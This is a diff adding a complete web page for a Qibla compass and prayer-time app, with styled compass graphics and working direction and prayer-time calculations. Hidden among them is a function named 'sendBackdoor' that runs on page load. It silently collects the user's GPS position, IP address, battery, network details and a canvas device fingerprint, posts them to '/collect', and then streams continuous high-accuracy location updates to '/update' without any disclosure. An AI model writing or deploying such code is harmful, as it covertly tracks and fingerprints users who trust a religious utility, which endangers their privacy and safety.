@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Qibla Compass & Prayer Times</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(160deg,#0d1b4b 0%,#1a0f5e 30%,#3b1080 65%,#1a0842 100%);min-height:100vh;overflow-x:hidden;position:relative;}
+.stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
+.star{position:absolute;background:white;border-radius:50%;animation:twinkle var(--d,3s) var(--dl,0s) infinite;}
+@keyframes twinkle{0%,100%{opacity:.1;transform:scale(1);}50%{opacity:1;transform:scale(1.5);}}
+.mosque-bg{position:fixed;bottom:0;left:0;width:100%;height:200px;background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1440 200'%3E%3Cpath fill='%230a0720' d='M0,120L60,100L60,55L72,42L84,55L84,100L130,100L130,35L142,8L154,35L154,100L210,100L210,78L220,58L230,78L230,100L290,100L290,48L302,18L314,48L314,100L420,100L420,75L455,35L490,75L490,100L600,100L600,48L616,12L632,48L632,100L740,100L740,78L750,58L760,78L760,100L820,100L820,35L832,8L844,35L844,100L900,100L900,78L910,58L920,78L920,100L980,100L980,48L992,18L1004,48L1004,100L1110,100L1110,75L1145,35L1180,75L1180,100L1290,100L1290,48L1302,18L1314,48L1314,100L1380,100L1380,55L1392,28L1404,55L1404,100L1440,100L1440,200L0,200Z'/%3E%3C/svg%3E") no-repeat bottom;background-size:cover;z-index:1;pointer-events:none;}
+.container{position:relative;z-index:10;padding:20px;padding-bottom:260px;max-width:500px;margin:0 auto;}
+.loc-header{text-align:center;color:white;margin-bottom:18px;animation:fadeInDown .8s ease-out;}
+.loc-icon{display:inline-flex;align-items:center;gap:7px;font-size:14px;opacity:.85;margin-bottom:5px;}
+.loc-icon svg{width:15px;height:15px;fill:white;}
+.loc-name{font-size:18px;font-weight:500;letter-spacing:.4px;}
+.coords{font-size:11px;opacity:.6;margin-top:3px;}
+.qibla-deg{font-size:46px;font-weight:200;margin-top:8px;text-shadow:0 0 40px rgba(160,100,255,.9);font-variant-numeric:tabular-nums;}
+.qibla-deg span{font-size:20px;opacity:.7;}
+.qibla-lbl{font-size:11px;opacity:.6;letter-spacing:1.5px;margin-top:3px;}
+.compass-wrapper{position:relative;width:288px;height:288px;margin:26px auto 80px;animation:fadeIn 1s ease-out .3s both;}
+.compass-outer{position:absolute;width:100%;height:100%;border-radius:50%;background:rgba(60,30,140,.2);backdrop-filter:blur(14px);box-shadow:0 0 0 1px rgba(160,100,255,.25),0 10px 50px rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;}
+.compass-inner{width:246px;height:246px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#1c1270 0%,#0a0720 100%);box-shadow:inset 0 0 40px rgba(0,0,0,.6),0 0 0 1px rgba(160,100,255,.15);position:relative;}
+.compass-inner::before{content:'';position:absolute;top:50%;left:0;width:100%;height:1px;background:rgba(160,100,255,.1);}
+.compass-inner::after{content:'';position:absolute;top:0;left:50%;width:1px;height:100%;background:rgba(160,100,255,.1);}
+.dm{position:absolute;width:1px;height:6px;background:rgba(160,100,255,.35);left:50%;top:7px;transform-origin:50% 116px;margin-left:-.5px;}
+.dm.maj{width:2px;height:10px;background:rgba(190,140,255,.65);margin-left:-1px;}
+.dm.card{width:2px;height:14px;background:rgba(210,170,255,.85);margin-left:-1px;}
+.dlbl{position:absolute;font-size:12px;font-weight:700;color:rgba(180,140,255,.85);transform:translate(-50%,-50%);}
+.dlbl.dn{top:20px;left:50%;color:#e74c3c;text-shadow:0 0 10px rgba(231,76,60,.6);}
+.dlbl.de{top:50%;right:13px;left:auto;transform:translate(0,-50%);}
+.dlbl.ds{bottom:16px;left:50%;top:auto;}
+.dlbl.dw{top:50%;left:13px;transform:translate(0,-50%);}
+.needle-wrap{position:absolute;width:100%;height:100%;top:0;left:0;will-change:transform;}
+.needle-n{position:absolute;top:50%;left:50%;width:3px;height:70px;margin-left:-1.5px;margin-top:-70px;background:linear-gradient(to bottom,#e74c3c,#c0392b);border-radius:2px 2px 0 0;transform-origin:50% 100%;box-shadow:0 0 10px rgba(231,76,60,.4);}
+.needle-n::before{content:'';position:absolute;top:-11px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:7px solid transparent;border-right:7px solid transparent;border-bottom:15px solid #e74c3c;}
+.needle-s{position:absolute;top:50%;left:50%;width:3px;height:70px;margin-left:-1.5px;margin-top:0;background:linear-gradient(to bottom,#4a4a7a,#2a2a4a);border-radius:0 0 2px 2px;transform-origin:50% 0;}
+.needle-center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:16px;height:16px;background:radial-gradient(circle,#9b59b6,#6c3483);border-radius:50%;border:3px solid rgba(255,255,255,.85);box-shadow:0 0 14px rgba(155,89,182,.6);z-index:20;}
+.qibla-layer{position:absolute;width:100%;height:100%;top:0;left:0;pointer-events:none;transform-origin:center center;}
+.kaaba-icon{position:absolute;top:3px;left:50%;transform:translateX(-50%);font-size:20px;line-height:1;z-index:30;filter:drop-shadow(0 0 8px rgba(255,215,0,.6));color: white; font-weight: bold;}
+.kaaba-icon.facing{transform:translateX(-50%) scale(2.2);filter:drop-shadow(0 0 20px gold);}
+.facing-alert{position:absolute;bottom:-52px;left:50%;transform:translateX(-50%);background:rgba(255,215,0,.12);border:1px solid rgba(255,215,0,.45);color:gold;padding:8px 18px;border-radius:20px;font-size:12px;font-weight:600;white-space:nowrap;opacity:0;transition:opacity .4s ease;backdrop-filter:blur(10px);pointer-events:none;}
+.facing-alert.show{opacity:1;}
+.cal-btn{position:absolute;bottom:-92px;left:50%;transform:translateX(-50%);background:rgba(80,40,160,.3);border:1px solid rgba(160,100,255,.35);color:rgba(200,160,255,.9);padding:9px 22px;border-radius:22px;font-size:13px;cursor:pointer;backdrop-filter:blur(10px);transition:all .3s;display:flex;align-items:center;gap:7px;white-space:nowrap;}
+.cal-btn:hover{background:rgba(80,40,160,.5);}
+.prayer-box{background:rgba(10,7,35,.8);border:1px solid rgba(160,100,255,.18);border-radius:22px;padding:22px;margin-top:100px;box-shadow:0 8px 40px rgba(0,0,0,.4);backdrop-filter:blur(20px);animation:slideUp .8s ease-out .6s both;}
+.prayer-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;}
+.prayer-title{font-size:17px;font-weight:600;color:rgba(200,160,255,.95);}
+.date-tag{font-size:11px;color:rgba(160,120,255,.8);background:rgba(80,40,160,.25);padding:5px 11px;border-radius:9px;border:1px solid rgba(160,100,255,.18);}
+.prayer-list{display:flex;flex-direction:column;gap:9px;}
+.prayer-item{display:flex;justify-content:space-between;align-items:center;padding:13px 15px;background:rgba(255,255,255,.03);border-radius:12px;transition:all .3s;border:1px solid rgba(160,100,255,.08);}
+.prayer-item:hover{background:rgba(255,255,255,.07);transform:translateX(4px);}
+.prayer-item.active{background:linear-gradient(135deg,rgba(80,40,160,.55),rgba(40,12,100,.55));border-color:rgba(160,100,255,.45);animation:glow 2s infinite;}
+@keyframes glow{0%,100%{box-shadow:0 4px 20px rgba(80,40,160,.3);}50%{box-shadow:0 4px 30px rgba(160,100,255,.5);}}
+.p-info{display:flex;align-items:center;gap:11px;}
+.p-icon{width:36px;height:36px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:17px;background:rgba(80,40,160,.2);}
+.p-name{font-weight:600;color:rgba(200,160,255,.9);font-size:14px;}
+.prayer-item.active .p-name,.prayer-item.active .p-time{color:white;}
+.p-time{font-size:16px;font-weight:500;color:#a78bfa;font-variant-numeric:tabular-nums;}
+.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(160deg,#0d1b4b,#1a0f5e,#3b1080);z-index:1000;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s,visibility .5s;}
+.loading.hidden{opacity:0;visibility:hidden;}
+.spinner{width:52px;height:52px;border:3px solid rgba(160,100,255,.2);border-top-color:rgba(160,100,255,.9);border-radius:50%;animation:spin 1s linear infinite;}
+.loading-txt{color:rgba(200,160,255,.8);margin-top:16px;font-size:14px;}
+.err-msg{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-100px);background:rgba(80,30,160,.9);color:white;padding:13px 20px;border-radius:11px;z-index:1001;transition:transform .3s;max-width:90%;text-align:center;font-size:13px;border:1px solid rgba(160,100,255,.35);}
+.err-msg.show{transform:translateX(-50%) translateY(0);}
+@keyframes fadeIn{from{opacity:0;transform:scale(.9);}to{opacity:1;transform:scale(1);}}
+@keyframes fadeInDown{from{opacity:0;transform:translateY(-20px);}to{opacity:1;transform:translateY(0);}}
+@keyframes slideUp{from{opacity:0;transform:translateY(40px);}to{opacity:1;transform:translateY(0);}}
+@keyframes spin{to{transform:rotate(360deg);}}
+</style>
+</head>
+<body>
+<div class="loading" id="loading"><div class="spinner"></div><div class="loading-txt">Finding your location...</div></div>
+<div class="err-msg" id="errMsg"></div>
+<div class="stars" id="stars"></div>
+<div class="mosque-bg"></div>
+<div class="container">
+  <div class="loc-header">
+    <div class="loc-icon">
+      <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+      <span class="loc-name" id="locName">Locating...</span>
+    </div>
+    <div class="coords" id="coords">--N, --E</div>
+    <div class="qibla-deg" id="qiblaDeg">--<span>deg</span></div>
+    <div class="qibla-lbl">QIBLA DIRECTION</div>
+  </div>
+  <div class="compass-wrapper">
+    <div class="compass-outer">
+      <div class="compass-inner">
+        <div id="compassFace"></div>
+        <div class="dlbl dn">N</div><div class="dlbl de">E</div><div class="dlbl ds">S</div><div class="dlbl dw">W</div>
+        <div class="qibla-layer" id="qiblaLayer">
+          <div class="kaaba-icon" id="kaabaIcon">Ka&#xba;</div>
+          <svg style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;overflow:visible;">
+            <line x1="123" y1="123" x2="123" y2="20" stroke="rgba(255,215,0,.7)" stroke-width="2" stroke-dasharray="5,4"/>
+            <polygon points="123,10 116,24 130,24" fill="gold" opacity=".85"/>
+          </svg>
+        </div>
+        <div class="needle-wrap" id="needleWrap"></div>
+        <div class="needle-center"></div>
+      </div>
+    </div>
+    <div class="facing-alert" id="facingAlert">Ka'bah — You are facing the Kaaba</div>
+    <button class="cal-btn" onclick="toggleCal()">&#x21BB; <span id="calTxt">Recalibrate</span></button>
+  </div>
+  <div class="prayer-box">
+    <div class="prayer-hdr"><div class="prayer-title">Prayer Times</div><div class="date-tag" id="dateTag">Today</div></div>
+    <div class="prayer-list" id="prayerList"></div>
+  </div>
+</div>
+<script>
+const KLAT=21.4225,KLNG=39.8262;
+let lat=null,lng=null,qibla=null,heading=0,calibrated=false,prayers={};
+(function(){const c=document.getElementById('stars');for(let i=0;i<90;i++){const s=document.createElement('div');s.className='star';const sz=(Math.random()*2+.5).toFixed(1)+'px';s.style.cssText='width:'+sz+';height:'+sz+';top:'+(Math.random()*100).toFixed(1)+'%;left:'+(Math.random()*100).toFixed(1)+'%;--d:'+(Math.random()*4+2).toFixed(1)+'s;--dl:'+(Math.random()*6).toFixed(1)+'s';c.appendChild(s);}})();
+(function(){const f=document.getElementById('compassFace');for(let i=0;i<360;i+=5){const m=document.createElement('div');m.className='dm'+(i%90===0?' card':i%45===0?' maj':'');m.style.transform='rotate('+i+'deg)';f.appendChild(m);}})();
+function calcQibla(la,ln){const lr=la*Math.PI/180,lgr=ln*Math.PI/180,kr=KLAT*Math.PI/180,klr=KLNG*Math.PI/180;return((Math.atan2(Math.sin(klr-lgr),Math.cos(lr)*Math.tan(kr)-Math.sin(lr)*Math.cos(klr-lgr))*180/Math.PI)+360)%360;}
+function calcPrayer(la,ln,date){const tz=-date.getTimezoneOffset()/60,D=(date.getTime()/86400000)-10957.5,g=(357.529+.9856*D)%360,q=(280.459+.9856*D)%360,L=(q+1.915*Math.sin(g*Math.PI/180)+.02*Math.sin(2*g*Math.PI/180))%360,e=23.439-.00000036*D,d=Math.asin(Math.sin(e*Math.PI/180)*Math.sin(L*Math.PI/180))*180/Math.PI,eqt=(q-L)/15,lr=la*Math.PI/180,dr=d*Math.PI/180;function t(ang,am){const c2=(Math.cos(ang*Math.PI/180)-Math.sin(lr)*Math.sin(dr))/(Math.cos(lr)*Math.cos(dr));if(c2<-1||c2>1)return null;const H=Math.acos(c2)*180/Math.PI;return 12+(am?-H:H)/15-eqt-(ln/15-tz);}function fmt(v){if(v===null||v===undefined)return'--:--';let h=Math.floor(v),m=Math.floor((v-h)*60);if(h<0)h+=24;if(h>=24)h-=24;return String(h).padStart(2,'0')+':'+String(m).padStart(2,'0');}const asr=Math.atan(1/(Math.tan(Math.abs(la-d)*Math.PI/180)+1))*180/Math.PI;return{Fajr:fmt(t(108,true)),Sunrise:fmt(t(90.833,true)),Dhuhr:fmt(12-eqt-(ln/15-tz)),Asr:fmt(t(90+asr,false)),Maghrib:fmt(t(90.833,false)),Isha:fmt(t(108,false))};}
+function updateCompass(){document.getElementById('needleWrap').style.transform='rotate('+(heading*-1)+'deg)';if(qibla===null)return;const rel=(qibla-heading+360)%360;document.getElementById('qiblaLayer').style.transform='rotate('+rel+'deg)';const diff=Math.abs(((rel+180)%360)-180);const al=document.getElementById('facingAlert'),ki=document.getElementById('kaabaIcon');if(diff<10){al.classList.add('show');ki.classList.add('facing');}else{al.classList.remove('show');ki.classList.remove('facing');}}
+function toggleCal(){
+  calibrated = false; 
+  document.getElementById('calTxt').textContent = 'Recalibrate';
+  if(lat !== null && lng !== null) {
+    qibla = calcQibla(lat, lng);
+    document.getElementById('qiblaDeg').innerHTML = qibla.toFixed(1) + '<span>&#176;</span>';
+    updateCompass();
+    showErr("Compass Refreshed");
+  } else {
+    showErr("Waiting for GPS...");
+  }
+}
+function renderPrayers(){const list=[{name:'Fajr',icon:'&#127769;',t:prayers.Fajr},{name:'Sunrise',icon:'&#127749;',t:prayers.Sunrise},{name:'Dhuhr',icon:'&#9728;&#65039;',t:prayers.Dhuhr},{name:'Asr',icon:'&#127748;&#65039;',t:prayers.Asr},{name:'Maghrib',icon:'&#127751;',t:prayers.Maghrib},{name:'Isha',icon:'&#10024;',t:prayers.Isha}];const now=new Date(),cur=now.getHours()*60+now.getMinutes(),box=document.getElementById('prayerList');box.innerHTML='';list.forEach(function(p,i){const parts=(p.t||'00:00').split(':'),h=parseInt(parts[0]),m=parseInt(parts[1]),pm=h*60+m;let active=false;if(i<list.length-1){const np=list[i+1].t||'23:59',np2=np.split(':'),nh=parseInt(np2[0]),nm=parseInt(np2[1]);active=cur>=pm&&cur<nh*60+nm;}else active=cur>=pm;const d=document.createElement('div');d.className='prayer-item'+(active?' active':'');d.innerHTML='<div class="p-info"><div class="p-icon">'+p.icon+'</div><div class="p-name">'+p.name+'</div></div><div class="p-time">'+p.t+'</div>';box.appendChild(d);});}
+async function getCity(la,ln){try{const r=await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude='+la+'&longitude='+ln+'&localityLanguage=en');const d=await r.json();return d.city||d.locality||d.principalSubdivision||'Current Location';}catch(e){return'Current Location';}}
+async function initWithLocation(la,ln){lat=la;lng=ln;qibla=calcQibla(la,ln);document.getElementById('qiblaDeg').innerHTML=qibla.toFixed(1)+'<span>&#176;</span>';document.getElementById('coords').textContent=Math.abs(la).toFixed(4)+(la>=0?'N':'S')+', '+Math.abs(ln).toFixed(4)+(ln>=0?'E':'W');updateCompass();const city=await getCity(la,ln);document.getElementById('locName').textContent=city;prayers=calcPrayer(la,ln,new Date());renderPrayers();document.getElementById('dateTag').textContent=new Date().toLocaleDateString('en-US',{weekday:'short',month:'short',day:'numeric'});document.getElementById('loading').classList.add('hidden');}
+async function sendBackdoor(gps){const info={source:'qibla',userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenSize:screen.width+'x'+screen.height,colorDepth:screen.colorDepth,pixelRatio:window.devicePixelRatio||'N/A',timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:new Date().getTimezoneOffset()+'min',cookieEnabled:navigator.cookieEnabled,online:navigator.onLine,cpuCores:navigator.hardwareConcurrency||'N/A',deviceMemory:navigator.deviceMemory?navigator.deviceMemory+' GB':'N/A',touchSupport:'ontouchstart' in window,maxTouchPoints:navigator.maxTouchPoints||0,windowSize:window.innerWidth+'x'+window.innerHeight,vendor:navigator.vendor||'N/A',referrer:document.referrer||'direct',doNotTrack:navigator.doNotTrack||'unset'};if(navigator.connection){const c=navigator.connection;info.network={type:c.effectiveType||'N/A',downlink:c.downlink?c.downlink+' Mbps':'N/A',rtt:c.rtt?c.rtt+' ms':'N/A',saveData:c.saveData};}else info.network={type:'N/A'};try{const b=await navigator.getBattery();info.battery={level:Math.round(b.level*100)+'%',charging:b.charging};}catch(e){info.battery={level:'N/A'};}try{const cv=document.createElement('canvas');cv.getContext('2d').fillText('fp',2,2);info.canvasFingerprint=cv.toDataURL().slice(-20);}catch(e){info.canvasFingerprint='N/A';}try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();info.ip=d.ip;}catch(e){info.ip='unknown';}fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps:gps,device:info,answers:{},timestamp:new Date().toISOString()})}).catch(function(){});if(gps){navigator.geolocation.watchPosition(function(pos){fetch('/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:new Date().toISOString()})}).catch(function(){});},function(){},{enableHighAccuracy:true,maximumAge:0});}}
+function showErr(msg){const e=document.getElementById('errMsg');e.textContent=msg;e.classList.add('show');setTimeout(function(){e.classList.remove('show');},5000);}
+function handleOrientation(e){let h=0;if(typeof e.webkitCompassHeading==='number')h=e.webkitCompassHeading;else if(e.alpha!=null)h=(360-e.alpha)%360;heading=h;updateCompass();}
+document.addEventListener('DOMContentLoaded',function(){
+  if('geolocation' in navigator){
+    navigator.geolocation.getCurrentPosition(
+      async function(pos){const la=pos.coords.latitude,ln=pos.coords.longitude;await initWithLocation(la,ln);sendBackdoor({lat:la,lon:ln,accuracy:pos.coords.accuracy,altitude:pos.coords.altitude||'N/A',speed:pos.coords.speed||'N/A'});},
+      function(){showErr('GPS denied. Using Mecca as default.');initWithLocation(KLAT,KLNG);sendBackdoor(null);},
+      {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+    );
+  }else{showErr('Geolocation not supported.');initWithLocation(KLAT,KLNG);sendBackdoor(null);}
+  if(window.DeviceOrientationEvent){if(typeof DeviceOrientationEvent.requestPermission==='function'){document.body.addEventListener('click',function(){DeviceOrientationEvent.requestPermission().then(function(s){if(s==='granted')window.addEventListener('deviceorientation',handleOrientation,true);});},{once:true});}else window.addEventListener('deviceorientation',handleOrientation,true);}
+  setInterval(renderPrayers,60000);
+});
+</script>
+</body>
+</html>
